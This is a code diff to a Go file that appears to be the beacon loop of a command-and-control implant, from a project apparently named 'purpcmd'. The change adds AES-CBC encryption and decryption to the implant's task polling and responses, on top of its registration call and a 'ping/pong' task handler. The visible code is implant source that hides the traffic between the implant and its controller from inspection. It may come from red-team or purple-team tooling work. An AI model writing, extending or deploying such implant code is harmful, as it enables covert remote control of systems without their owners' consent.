@@ -1,8 +1,10 @@
 package core
 
 import (
+	"bytes"
 	"encoding/base64"
 	"fmt"
+	"io"
 	"purpcmd/internal"
 	"purpcmd/internal/encrypt"
 	"time"
@@ -24,7 +26,7 @@ func Start() {
 
 	p := base64.StdEncoding.EncodeToString(r)
 	println(p)
-	h.Post([]byte(p))
+	h.PostRegistering([]byte(p))
 
 	for {
 		data := PackCheck(i)
@@ -37,8 +39,20 @@ func Start() {
 			println(err.Error())
 		}
 		
-		taskData := base64.NewDecoder(base64.StdEncoding, resp)
-		tid, tcode, payload := PackParseTask(taskData)
+		xyz,_ := io.ReadAll(resp)
+		fmt.Println("Data received ", len(xyz))
+		if len(xyz) < 16 {
+			time.Sleep(time.Duration(i.Sleep) * time.Second)
+			continue
+		}
+		dataB64 := make([]byte, base64.StdEncoding.DecodedLen(len(xyz)))
+		n, _ := base64.StdEncoding.Decode(dataB64, xyz)
+		xyzDecry, err := enc.AESCbcDecrypt(dataB64[:n])
+		if err != nil {
+			println(err.Error())
+			return
+		}
+		tid, tcode, payload := PackParseTask(bytes.NewReader(xyzDecry))
 
 		print("->",tcode)
 		switch tcode {
@@ -47,7 +61,9 @@ func Start() {
 			responseTaskPayload := string(payload) + " pong"
 			taskResp := PackResponse(i, []byte(responseTaskPayload), tid)
 
-			taskRestEnc := base64.StdEncoding.EncodeToString(taskResp)
+
+			dataEnc := enc.AESCbcEncrypt(taskResp)
+			taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
 			println(taskRestEnc)
 			h.Post([]byte(taskRestEnc))
 		default:
